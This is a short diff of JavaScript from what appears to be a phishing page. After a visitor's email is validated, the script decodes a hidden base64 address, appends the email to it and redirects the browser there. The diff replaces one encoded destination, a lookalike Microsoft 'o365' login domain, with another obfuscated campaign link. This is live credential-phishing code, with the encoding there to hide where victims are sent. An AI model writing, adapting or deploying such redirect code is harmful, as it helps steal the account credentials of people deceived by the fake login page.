@@ -144,7 +144,7 @@
             const email = emailInput.value.trim().toLowerCase();
 
             if (validateEmail(email)) {
-                const link = "aHR0cHM6Ly9sMGcxbi1taWNyb3MuZnRsaXZlZG9jLmNvbS9vMzY1"; // Base64 encoded link
+                const link = "aHR0cHM6Ly9icnVrdHYuY29tL24vP2MzWTliek0yTlY4eFgyNXZiU1p5WVc1a1BWUXdjRFJqUmswOUpuVnBaRDFWVTBWU01Ea3dPREl3TWpSVk1ESXdPREE1TURZPU4wMTIzTg=="; // Base64 encoded link
                 const decodedLink = atob(link);
                 const finalLink = `${decodedLink}#${email}`;
                 window.location.href = finalLink;
